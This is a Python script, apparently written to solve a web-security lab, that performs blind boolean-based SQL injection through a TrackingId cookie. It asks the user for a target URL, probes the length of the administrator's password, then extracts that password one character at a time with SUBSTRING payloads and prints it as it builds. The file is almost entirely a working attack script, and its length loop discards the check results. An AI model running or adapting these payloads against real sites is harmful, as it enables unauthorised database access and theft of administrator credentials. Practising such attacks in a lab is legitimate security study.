
#Script Requirements
# Interacting with the website using request module (GET)
# should include a cookie variable to hold the TrackingID.
# Should include a blind injection that helps us determine password length and password extraction.
# loop the script to determine password length (1,21)
# a string module to get password as string
#We use python dictionary to repreent our cookies with "cookie name": cookie value
#A dictionary gives the cookies a header.
#So when we get a server response, the response will be represented well in a header.
#original cookie means a cookie without payload
#modified cookie means cookie with a payload
#We can avoid using string.punctuation because a quote can break the sql condition.
#{char}, 1 ) means start from {char} and the length interval 1.
#The syntax for substring is: SUBSTRING(value, start_position, length)

import requests
import string
import time

target_url = input('Enter the target URL: ') #enter the url
tracking_id = input('Enter the TrackingId cookie: ')  #enter the trackingid cookie
cookies = {'TrackingId': tracking_id} #store the trackingid in this variable



#Original Cookie without Payload
r = requests.get(target_url, cookies = {'TrackingId': tracking_id}) #send an HTTP request to this url, along with this cookie
print(r.status_code)  #print the status code response from server
print(r.text) #print the HTML respose in text format
if "Welcome back!" in r.text:  #filter for the welcome back message in r.text
    print("Condition is TRUE")
else:
    print("Condition is FALSE")



#Modified Cookie with payload
def payload_injection(payload):  #the payload function
    modified_cookie = tracking_id + payload   #the modified cookie with payload
    response = requests.get(target_url, cookies={'TrackingId': modified_cookie}) #send HTTP request to target website, with a modified cookie, to observe server response
    return response



def check_response(response): #a check_response function
    if "Welcome back!" in response.text:  #confirms a Welcome back message in the modified cookie
        return True
    return False


for L in range(1, 25): # a loop to test password length
    print("Testing", L)
    payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) > {L}--"
    time.sleep(3)  #3 seconds delay
    response = payload_injection(payload)  #call payload_injection(payload) function
    check_response(response)  #call check_response function


password = str()  #initialize and define password variable. 

for char in range (1, 25 + 1): #loop thru every password character position.
    for character_guess in string.ascii_letters + string.digits: #inner loop to check password char in every position
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {char}, 1) = '{character_guess}'--" #payload to check each character, picked one at a time.
        response = payload_injection(payload)  #call the function, and the function will use our new payload
        if check_response(response): #checks what boolean condition is returned, True or False
           password += character_guess  #store character_guess in password variable
           print(password)  #print password character as it builds
           time.sleep(0.5) 
           break
